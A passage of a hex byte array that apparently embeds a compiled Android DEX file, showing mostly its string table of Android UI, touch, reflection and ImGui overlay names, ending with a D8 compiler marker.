    0x74, 0x00, 0x09, 0x67, 0x65, 0x74, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x0f, 0x67, 0x65, 
    0x74, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x4d, 0x61, 0x73, 0x6b, 0x65, 0x64, 0x00, 0x0e, 0x67, 
    0x65, 0x74, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x19, 0x67, 
    0x65, 0x74, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x57, 0x69, 0x6e, 
    0x64, 0x6f, 0x77, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x00, 0x0d, 0x67, 0x65, 0x74, 0x41, 0x74, 0x74, 
    0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x42, 0x6f, 0x6f, 0x6c, 
    0x65, 0x61, 0x6e, 0x00, 0x08, 0x67, 0x65, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x00, 0x10, 0x67, 
    0x65, 0x74, 0x44, 0x65, 0x63, 0x6c, 0x61, 0x72, 0x65, 0x64, 0x46, 0x69, 0x65, 0x6c, 0x64, 0x00, 
    0x0c, 0x67, 0x65, 0x74, 0x44, 0x65, 0x63, 0x6f, 0x72, 0x56, 0x69, 0x65, 0x77, 0x00, 0x11, 0x67, 
    0x65, 0x74, 0x44, 0x69, 0x73, 0x70, 0x6c, 0x61, 0x79, 0x4d, 0x65, 0x74, 0x72, 0x69, 0x63, 0x73, 
    0x00, 0x15, 0x67, 0x65, 0x74, 0x46, 0x6c, 0x6f, 0x61, 0x74, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x6e, 
    0x65, 0x6c, 0x57, 0x69, 0x64, 0x74, 0x68, 0x00, 0x13, 0x67, 0x65, 0x74, 0x48, 0x61, 0x6c, 0x66, 
    0x53, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x48, 0x65, 0x69, 0x67, 0x68, 0x74, 0x00, 0x09, 0x67, 0x65, 
    0x74, 0x48, 0x6f, 0x6c, 0x64, 0x65, 0x72, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x4b, 0x65, 0x79, 0x43, 
    0x6f, 0x64, 0x65, 0x00, 0x10, 0x67, 0x65, 0x74, 0x4b, 0x65, 0x79, 0x62, 0x6f, 0x61, 0x72, 0x64, 
    0x53, 0x74, 0x61, 0x74, 0x65, 0x00, 0x0d, 0x67, 0x65, 0x74, 0x4d, 0x61, 0x69, 0x6e, 0x4c, 0x6f, 
    0x6f, 0x70, 0x65, 0x72, 0x00, 0x09, 0x67, 0x65, 0x74, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x00, 
    0x07, 0x67, 0x65, 0x74, 0x4e, 0x61, 0x6d, 0x65, 0x00, 0x09, 0x67, 0x65, 0x74, 0x50, 0x61, 0x72, 
    0x65, 0x6e, 0x74, 0x00, 0x0c, 0x67, 0x65, 0x74, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 
    0x73, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x00, 0x10, 0x67, 
    0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x00, 
    0x07, 0x67, 0x65, 0x74, 0x54, 0x65, 0x78, 0x74, 0x00, 0x09, 0x67, 0x65, 0x74, 0x57, 0x69, 0x6e, 
    0x64, 0x6f, 0x77, 0x00, 0x0d, 0x67, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x52, 0x65, 
    0x63, 0x74, 0x00, 0x0e, 0x67, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x54, 0x6f, 0x6b, 
    0x65, 0x6e, 0x00, 0x04, 0x67, 0x65, 0x74, 0x58, 0x00, 0x04, 0x67, 0x65, 0x74, 0x59, 0x00, 0x07, 
    0x67, 0x72, 0x61, 0x76, 0x69, 0x74, 0x79, 0x00, 0x07, 0x68, 0x61, 0x73, 0x4e, 0x65, 0x78, 0x74, 
    0x00, 0x06, 0x68, 0x65, 0x69, 0x67, 0x68, 0x74, 0x00, 0x0c, 0x68, 0x65, 0x69, 0x67, 0x68, 0x74, 
    0x50, 0x69, 0x78, 0x65, 0x6c, 0x73, 0x00, 0x17, 0x68, 0x69, 0x64, 0x65, 0x53, 0x6f, 0x66, 0x74, 
    0x49, 0x6e, 0x70, 0x75, 0x74, 0x46, 0x72, 0x6f, 0x6d, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x00, 
    0x01, 0x69, 0x00, 0x0b, 0x69, 0x63, 0x5f, 0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x65, 0x72, 0x00, 
    0x16, 0x69, 0x63, 0x5f, 0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x65, 0x72, 0x5f, 0x62, 0x61, 0x63, 
    0x6b, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 0x00, 0x16, 0x69, 0x63, 0x5f, 0x6c, 0x61, 0x75, 0x6e, 
    0x63, 0x68, 0x65, 0x72, 0x5f, 0x66, 0x6f, 0x72, 0x65, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 0x00, 
    0x11, 0x69, 0x63, 0x5f, 0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x65, 0x72, 0x5f, 0x72, 0x6f, 0x75, 
    0x6e, 0x64, 0x00, 0x0c, 0x69, 0x6d, 0x47, 0x75, 0x69, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 
    0x00, 0x0d, 0x69, 0x6d, 0x67, 0x75, 0x69, 0x53, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x00, 
    0x09, 0x69, 0x6e, 0x69, 0x74, 0x49, 0x6d, 0x67, 0x75, 0x69, 0x00, 0x0c, 0x69, 0x6e, 0x70, 0x75, 
    0x74, 0x5f, 0x6d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x00, 0x09, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x72, 
    0x75, 0x70, 0x74, 0x00, 0x06, 0x69, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x00, 0x07, 0x69, 0x73, 0x45, 
    0x6d, 0x70, 0x74, 0x79, 0x00, 0x09, 0x69, 0x73, 0x45, 0x6e, 0x74, 0x65, 0x72, 0x55, 0x70, 0x00, 
    0x0d, 0x69, 0x73, 0x4d, 0x65, 0x6e, 0x75, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6c, 0x65, 0x00, 0x08, 
    0x69, 0x74, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x0c, 0x6c, 0x61, 0x73, 0x74, 0x48, 0x61, 
    0x6e, 0x64, 0x6c, 0x65, 0x72, 0x48, 0x00, 0x0c, 0x6c, 0x61, 0x73, 0x74, 0x48, 0x61, 0x6e, 0x64, 
    0x6c, 0x65, 0x72, 0x57, 0x00, 0x0c, 0x6c, 0x61, 0x73, 0x74, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 
    0x72, 0x58, 0x00, 0x0c, 0x6c, 0x61, 0x73, 0x74, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x59, 
    0x00, 0x06, 0x6c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x00, 0x19, 0x6c, 0x61, 0x79, 0x6f, 0x75, 0x74, 
    0x49, 0x6e, 0x44, 0x69, 0x73, 0x70, 0x6c, 0x61, 0x79, 0x43, 0x75, 0x74, 0x6f, 0x75, 0x74, 0x4d, 
    0x6f, 0x64, 0x65, 0x00, 0x06, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x00, 0x0b, 0x6d, 0x41, 0x63, 
    0x74, 0x69, 0x76, 0x69, 0x74, 0x69, 0x65, 0x73, 0x00, 0x09, 0x6d, 0x41, 0x63, 0x74, 0x69, 0x76, 
    0x69, 0x74, 0x79, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x13, 0x6d, 0x61, 0x6b, 0x65, 0x50, 
    0x72, 0x65, 0x73, 0x73, 0x65, 0x64, 0x44, 0x72, 0x61, 0x77, 0x61, 0x62, 0x6c, 0x65, 0x00, 0x13, 
    0x6d, 0x61, 0x6b, 0x65, 0x52, 0x6f, 0x75, 0x6e, 0x64, 0x65, 0x64, 0x44, 0x72, 0x61, 0x77, 0x61, 
    0x62, 0x6c, 0x65, 0x00, 0x03, 0x6d, 0x61, 0x78, 0x00, 0x06, 0x6d, 0x69, 0x70, 0x6d, 0x61, 0x70, 
    0x00, 0x04, 0x6d, 0x6f, 0x64, 0x65, 0x00, 0x10, 0x6d, 0x6f, 0x74, 0x69, 0x6f, 0x6e, 0x45, 0x76, 
    0x65, 0x6e, 0x74, 0x43, 0x6c, 0x69, 0x63, 0x6b, 0x00, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x00, 0x05, 
    0x6e, 0x61, 0x6d, 0x65, 0x73, 0x00, 0x13, 0x6e, 0x61, 0x74, 0x69, 0x76, 0x65, 0x49, 0x73, 0x4d, 
    0x65, 0x6e, 0x75, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6c, 0x65, 0x00, 0x04, 0x6e, 0x65, 0x78, 0x74, 
    0x00, 0x11, 0x6f, 0x6e, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x43, 0x72, 0x65, 0x61, 
    0x74, 0x65, 0x64, 0x00, 0x13, 0x6f, 0x6e, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x44, 
    0x65, 0x73, 0x74, 0x72, 0x6f, 0x79, 0x65, 0x64, 0x00, 0x10, 0x6f, 0x6e, 0x41, 0x63, 0x74, 0x69, 
    0x76, 0x69, 0x74, 0x79, 0x50, 0x61, 0x75, 0x73, 0x65, 0x64, 0x00, 0x11, 0x6f, 0x6e, 0x41, 0x63, 
    0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x64, 0x00, 0x1b, 0x6f, 
    0x6e, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x53, 0x61, 0x76, 0x65, 0x49, 0x6e, 0x73, 
    0x74, 0x61, 0x6e, 0x63, 0x65, 0x53, 0x74, 0x61, 0x74, 0x65, 0x00, 0x11, 0x6f, 0x6e, 0x41, 0x63, 
    0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x53, 0x74, 0x61, 0x72, 0x74, 0x65, 0x64, 0x00, 0x11, 0x6f, 
    0x6e, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79, 0x53, 0x74, 0x6f, 0x70, 0x70, 0x65, 0x64, 
    0x00, 0x0d, 0x6f, 0x6e, 0x42, 0x61, 0x63, 0x6b, 0x50, 0x72, 0x65, 0x73, 0x73, 0x65, 0x64, 0x00, 
    0x07, 0x6f, 0x6e, 0x43, 0x6c, 0x69, 0x63, 0x6b, 0x00, 0x14, 0x6f, 0x6e, 0x44, 0x65, 0x74, 0x61, 
    0x63, 0x68, 0x65, 0x64, 0x46, 0x72, 0x6f, 0x6d, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x00, 0x0b, 
    0x6f, 0x6e, 0x44, 0x72, 0x61, 0x77, 0x46, 0x72, 0x61, 0x6d, 0x65, 0x00, 0x0e, 0x6f, 0x6e, 0x45, 
    0x64, 0x69, 0x74, 0x6f, 0x72, 0x41, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x05, 0x6f, 0x6e, 0x4b, 
    0x65, 0x79, 0x00, 0x07, 0x6f, 0x6e, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00, 0x08, 0x6f, 0x6e, 0x52, 
    0x65, 0x73, 0x75, 0x6d, 0x65, 0x00, 0x10, 0x6f, 0x6e, 0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 
    0x43, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x64, 0x00, 0x10, 0x6f, 0x6e, 0x53, 0x75, 0x72, 0x66, 0x61, 
    0x63, 0x65, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x00, 0x07, 0x6f, 0x6e, 0x54, 0x6f, 0x75, 
    0x63, 0x68, 0x00, 0x22, 0x6f, 0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 0x20, 0x72, 0x65, 0x66, 0x72, 
    0x65, 0x73, 0x68, 0x20, 0x66, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x2c, 0x20, 0x72, 0x65, 0x63, 0x72, 
    0x65, 0x61, 0x74, 0x69, 0x6e, 0x67, 0x00, 0x05, 0x70, 0x61, 0x6e, 0x65, 0x6c, 0x00, 0x0a, 0x70, 
    0x61, 0x72, 0x73, 0x65, 0x46, 0x6c, 0x6f, 0x61, 0x74, 0x00, 0x08, 0x70, 0x61, 0x72, 0x73, 0x65, 
    0x49, 0x6e, 0x74, 0x00, 0x06, 0x70, 0x61, 0x75, 0x73, 0x65, 0x64, 0x00, 0x04, 0x70, 0x6f, 0x73, 
    0x74, 0x00, 0x0b, 0x70, 0x6f, 0x73, 0x74, 0x44, 0x65, 0x6c, 0x61, 0x79, 0x65, 0x64, 0x00, 0x0a, 
    0x70, 0x75, 0x72, 0x70, 0x6c, 0x65, 0x5f, 0x32, 0x30, 0x30, 0x00, 0x0a, 0x70, 0x75, 0x72, 0x70, 
    0x6c, 0x65, 0x5f, 0x35, 0x30, 0x30, 0x00, 0x0a, 0x70, 0x75, 0x72, 0x70, 0x6c, 0x65, 0x5f, 0x37, 
    0x30, 0x30, 0x00, 0x22, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x41, 0x63, 0x74, 0x69, 
    0x76, 0x69, 0x74, 0x79, 0x4c, 0x69, 0x66, 0x65, 0x63, 0x79, 0x63, 0x6c, 0x65, 0x43, 0x61, 0x6c, 
    0x6c, 0x62, 0x61, 0x63, 0x6b, 0x73, 0x00, 0x0f, 0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65, 0x43, 0x61, 
    0x6c, 0x6c, 0x62, 0x61, 0x63, 0x6b, 0x73, 0x00, 0x12, 0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65, 0x54, 
    0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x00, 0x13, 0x72, 0x65, 0x6d, 
    0x6f, 0x76, 0x65, 0x56, 0x69, 0x65, 0x77, 0x49, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74, 0x65, 
    0x00, 0x11, 0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65, 0x56, 0x69, 0x65, 0x77, 0x51, 0x75, 0x69, 0x65, 
    0x74, 0x6c, 0x79, 0x00, 0x07, 0x72, 0x65, 0x70, 0x6c, 0x61, 0x63, 0x65, 0x00, 0x0c, 0x72, 0x65, 
    0x71, 0x75, 0x65, 0x73, 0x74, 0x46, 0x6f, 0x63, 0x75, 0x73, 0x00, 0x0d, 0x72, 0x65, 0x71, 0x75, 
    0x65, 0x73, 0x74, 0x52, 0x65, 0x6e, 0x64, 0x65, 0x72, 0x00, 0x15, 0x72, 0x65, 0x73, 0x75, 0x6d, 
    0x65, 0x45, 0x78, 0x69, 0x73, 0x74, 0x69, 0x6e, 0x67, 0x4f, 0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 
    0x00, 0x18, 0x72, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x64, 0x20, 0x65, 0x78, 0x69, 0x73, 0x74, 0x69, 
    0x6e, 0x67, 0x20, 0x6f, 0x76, 0x65, 0x72, 0x6c, 0x61, 0x79, 0x00, 0x05, 0x72, 0x6f, 0x75, 0x6e, 
    0x64, 0x00, 0x03, 0x72, 0x75, 0x6e, 0x00, 0x0d, 0x73, 0x65, 0x74, 0x41, 0x63, 0x63, 0x65, 0x73, 
    0x73, 0x69, 0x62, 0x6c, 0x65, 0x00, 0x0a, 0x73, 0x65, 0x74, 0x41, 0x6c, 0x6c, 0x43, 0x61, 0x70, 
    0x73, 0x00, 0x0d, 0x73, 0x65, 0x74, 0x42, 0x61, 0x63, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 
    0x00, 0x12, 0x73, 0x65, 0x74, 0x42, 0x61, 0x63, 0x6b, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 0x43, 
    0x6f, 0x6c, 0x6f, 0x72, 0x00, 0x0c, 0x73, 0x65, 0x74, 0x43, 0x6c, 0x69, 0x63, 0x6b, 0x61, 0x62, 
    0x6c, 0x65, 0x00, 0x08, 0x73, 0x65, 0x74, 0x43, 0x6f, 0x6c, 0x6f, 0x72, 0x00, 0x0f, 0x73, 0x65, 
    0x74, 0x43, 0x6f, 0x72, 0x6e, 0x65, 0x72, 0x52, 0x61, 0x64, 0x69, 0x75, 0x73, 0x00, 0x13, 0x73, 
    0x65, 0x74, 0x45, 0x47, 0x4c, 0x43, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x43, 0x68, 0x6f, 0x6f, 0x73, 
    0x65, 0x72, 0x00, 0x1a, 0x73, 0x65, 0x74, 0x45, 0x47, 0x4c, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 
    0x74, 0x43, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x00, 0x0c, 
    0x73, 0x65, 0x74, 0x45, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x0c, 0x73, 0x65, 
    0x74, 0x46, 0x6f, 0x63, 0x75, 0x73, 0x61, 0x62, 0x6c, 0x65, 0x00, 0x09, 0x73, 0x65, 0x74, 0x46, 
    0x6f, 0x72, 0x6d, 0x61, 0x74, 0x00, 0x0a, 0x73, 0x65, 0x74, 0x47, 0x72, 0x61, 0x76, 0x69, 0x74, 
    0x79, 0x00, 0x10, 0x73, 0x65, 0x74, 0x48, 0x69, 0x6e, 0x74, 0x54, 0x65, 0x78, 0x74, 0x43, 0x6f, 
    0x6c, 0x6f, 0x72, 0x00, 0x0d, 0x73, 0x65, 0x74, 0x49, 0x6d, 0x65, 0x4f, 0x70, 0x74, 0x69, 0x6f, 
    0x6e, 0x73, 0x00, 0x0c, 0x73, 0x65, 0x74, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x54, 0x79, 0x70, 0x65, 
    0x00, 0x0c, 0x73, 0x65, 0x74, 0x4d, 0x69, 0x6e, 0x48, 0x65, 0x69, 0x67, 0x68, 0x74, 0x00, 0x12, 
    0x73, 0x65, 0x74, 0x4f, 0x6e, 0x43, 0x6c, 0x69, 0x63, 0x6b, 0x4c, 0x69, 0x73, 0x74, 0x65, 0x6e, 
    0x65, 0x72, 0x00, 0x19, 0x73, 0x65, 0x74, 0x4f, 0x6e, 0x45, 0x64, 0x69, 0x74, 0x6f, 0x72, 0x41, 
    0x63, 0x74, 0x69, 0x6f, 0x6e, 0x4c, 0x69, 0x73, 0x74, 0x65, 0x6e, 0x65, 0x72, 0x00, 0x10, 0x73, 
    0x65, 0x74, 0x4f, 0x6e, 0x4b, 0x65, 0x79, 0x4c, 0x69, 0x73, 0x74, 0x65, 0x6e, 0x65, 0x72, 0x00, 
    0x12, 0x73, 0x65, 0x74, 0x4f, 0x6e, 0x54, 0x6f, 0x75, 0x63, 0x68, 0x4c, 0x69, 0x73, 0x74, 0x65, 
    0x6e, 0x65, 0x72, 0x00, 0x0e, 0x73, 0x65, 0x74, 0x4f, 0x72, 0x69, 0x65, 0x6e, 0x74, 0x61, 0x74, 
    0x69, 0x6f, 0x6e, 0x00, 0x0a, 0x73, 0x65, 0x74, 0x50, 0x61, 0x64, 0x64, 0x69, 0x6e, 0x67, 0x00, 
    0x0d, 0x73, 0x65, 0x74, 0x52, 0x65, 0x6e, 0x64, 0x65, 0x72, 0x4d, 0x6f, 0x64, 0x65, 0x00, 0x0b, 
    0x73, 0x65, 0x74, 0x52, 0x65, 0x6e, 0x64, 0x65, 0x72, 0x65, 0x72, 0x00, 0x13, 0x73, 0x65, 0x74, 
    0x53, 0x65, 0x6c, 0x65, 0x63, 0x74, 0x41, 0x6c, 0x6c, 0x4f, 0x6e, 0x46, 0x6f, 0x63, 0x75, 0x73, 
    0x00, 0x0c, 0x73, 0x65, 0x74, 0x53, 0x65, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x0d, 
    0x73, 0x65, 0x74, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4c, 0x69, 0x6e, 0x65, 0x00, 0x09, 0x73, 
    0x65, 0x74, 0x53, 0x74, 0x72, 0x6f, 0x6b, 0x65, 0x00, 0x07, 0x73, 0x65, 0x74, 0x54, 0x65, 0x78, 
    0x74, 0x00, 0x0c, 0x73, 0x65, 0x74, 0x54, 0x65, 0x78, 0x74, 0x43, 0x6f, 0x6c, 0x6f, 0x72, 0x00, 
    0x0b, 0x73, 0x65, 0x74, 0x54, 0x65, 0x78, 0x74, 0x53, 0x69, 0x7a, 0x65, 0x00, 0x0b, 0x73, 0x65, 
    0x74, 0x54, 0x79, 0x70, 0x65, 0x66, 0x61, 0x63, 0x65, 0x00, 0x0d, 0x73, 0x65, 0x74, 0x56, 0x69, 
    0x73, 0x69, 0x62, 0x69, 0x6c, 0x69, 0x74, 0x79, 0x00, 0x0e, 0x73, 0x65, 0x74, 0x5a, 0x4f, 0x72, 
    0x64, 0x65, 0x72, 0x4f, 0x6e, 0x54, 0x6f, 0x70, 0x00, 0x0a, 0x73, 0x68, 0x6f, 0x77, 0x45, 0x64, 
    0x69, 0x74, 0x6f, 0x72, 0x00, 0x0d, 0x73, 0x68, 0x6f, 0x77, 0x53, 0x6f, 0x66, 0x74, 0x49, 0x6e, 
    0x70, 0x75, 0x74, 0x00, 0x05, 0x73, 0x6c, 0x65, 0x65, 0x70, 0x00, 0x0d, 0x73, 0x6f, 0x66, 0x74, 
    0x49, 0x6e, 0x70, 0x75, 0x74, 0x4d, 0x6f, 0x64, 0x65, 0x00, 0x05, 0x73, 0x70, 0x6c, 0x69, 0x74, 
    0x00, 0x05, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x11, 0x73, 0x74, 0x61, 0x72, 0x74, 0x54, 0x6f, 
    0x75, 0x63, 0x68, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x72, 0x00, 0x07, 0x73, 0x74, 0x61, 0x72, 
    0x74, 0x65, 0x64, 0x00, 0x0b, 0x73, 0x74, 0x61, 0x72, 0x74, 0x65, 0x64, 0x20, 0x6f, 0x6e, 0x20, 
    0x00, 0x04, 0x73, 0x74, 0x6f, 0x70, 0x00, 0x06, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x05, 
    0x73, 0x74, 0x79, 0x6c, 0x65, 0x00, 0x08, 0x74, 0x65, 0x61, 0x6c, 0x5f, 0x32, 0x30, 0x30, 0x00, 
    0x08, 0x74, 0x65, 0x61, 0x6c, 0x5f, 0x37, 0x30, 0x30, 0x00, 0x06, 0x74, 0x68, 0x69, 0x73, 0x24, 
    0x30, 0x00, 0x08, 0x74, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x05, 0x74, 0x6f, 0x6b, 
    0x65, 0x6e, 0x00, 0x09, 0x74, 0x6f, 0x70, 0x4d, 0x61, 0x72, 0x67, 0x69, 0x6e, 0x00, 0x11, 0x74, 
    0x6f, 0x75, 0x63, 0x68, 0x20, 0x64, 0x6f, 0x77, 0x6e, 0x20, 0x69, 0x6e, 0x64, 0x65, 0x78, 0x3d, 
    0x00, 0x0f, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x20, 0x75, 0x70, 0x20, 0x69, 0x6e, 0x64, 0x65, 0x78, 
    0x3d, 0x00, 0x24, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x20, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x20, 
    0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x20, 0x66, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x20, 0x61, 0x74, 
    0x20, 0x69, 0x6e, 0x64, 0x65, 0x78, 0x20, 0x00, 0x17, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x20, 0x77, 
    0x69, 0x6e, 0x64, 0x6f, 0x77, 0x5b, 0x30, 0x5d, 0x20, 0x72, 0x65, 0x63, 0x74, 0x20, 0x78, 0x3d, 
    0x00, 0x12, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x47, 0x65, 0x73, 0x74, 0x75, 0x72, 0x65, 0x41, 0x63, 
    0x74, 0x69, 0x76, 0x65, 0x00, 0x0c, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 0x64, 0x6c, 
    0x65, 0x72, 0x00, 0x12, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 
    0x50, 0x61, 0x72, 0x61, 0x6d, 0x73, 0x00, 0x0d, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 
    0x64, 0x6c, 0x65, 0x72, 0x73, 0x00, 0x0d, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x4c, 0x6f, 0x67, 0x43, 
    0x6f, 0x75, 0x6e, 0x74, 0x00, 0x0c, 0x74, 0x6f, 0x75, 0x63, 0x68, 0x55, 0x70, 0x64, 0x61, 0x74, 
    0x65, 0x72, 0x00, 0x06, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x00, 0x0a, 0x75, 0x70, 0x64, 0x61, 
    0x74, 0x65, 0x53, 0x69, 0x7a, 0x65, 0x00, 0x13, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x54, 0x6f, 
    0x75, 0x63, 0x68, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x73, 0x00, 0x10, 0x75, 0x70, 0x64, 
    0x61, 0x74, 0x65, 0x56, 0x69, 0x65, 0x77, 0x4c, 0x61, 0x79, 0x6f, 0x75, 0x74, 0x00, 0x0b, 0x76, 
    0x61, 0x6c, 0x24, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x0b, 0x76, 0x61, 0x6c, 0x24, 
    0x63, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x00, 0x09, 0x76, 0x61, 0x6c, 0x24, 0x69, 0x6e, 0x64, 
    0x65, 0x78, 0x00, 0x0d, 0x76, 0x61, 0x6c, 0x24, 0x6d, 0x75, 0x6c, 0x74, 0x69, 0x6c, 0x69, 0x6e, 
    0x65, 0x00, 0x05, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x00, 0x06, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x73, 
    0x00, 0x01, 0x77, 0x00, 0x12, 0x77, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x41, 0x70, 0x70, 0x6c, 
    0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x05, 0x77, 0x68, 0x69, 0x74, 0x65, 0x00, 0x05, 
    0x77, 0x69, 0x64, 0x74, 0x68, 0x00, 0x0b, 0x77, 0x69, 0x64, 0x74, 0x68, 0x50, 0x69, 0x78, 0x65, 
    0x6c, 0x73, 0x00, 0x06, 0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x00, 0x0d, 0x77, 0x69, 0x6e, 0x64, 
    0x6f, 0x77, 0x4d, 0x61, 0x6e, 0x61, 0x67, 0x65, 0x72, 0x00, 0x10, 0x77, 0x69, 0x6e, 0x64, 0x6f, 
    0x77, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64, 0x00, 0x01, 0x78, 0x00, 0x03, 
    0x78, 0x6d, 0x6c, 0x00, 0x01, 0x79, 0x00, 0x69, 0x7e, 0x7e, 0x44, 0x38, 0x7b, 0x22, 0x62, 0x61, 
    0x63, 0x6b, 0x65, 0x6e, 0x64, 0x22, 0x3a, 0x22, 0x64, 0x65, 0x78, 0x22, 0x2c, 0x22, 0x63, 0x6f, 
    0x6d, 0x70, 0x69, 0x6c, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2d, 0x6d, 0x6f, 0x64, 0x65, 0x22, 0x3a, 
    0x22, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x22, 0x2c, 0x22, 0x68, 0x61, 0x73, 0x2d, 0x63, 
    0x68, 0x65, 0x63, 0x6b, 0x73, 0x75, 0x6d, 0x73, 0x22, 0x3a, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x2c, 
    0x22, 0x6d, 0x69, 0x6e, 0x2d, 0x61, 0x70, 0x69, 0x22, 0x3a, 0x32, 0x36, 0x2c, 0x22, 0x76, 0x65, 
    0x72, 0x73, 0x69, 0x6f, 0x6e, 0x22, 0x3a, 0x22, 0x38, 0x2e, 0x31, 0x33, 0x2e, 0x31, 0x39, 0x22, 
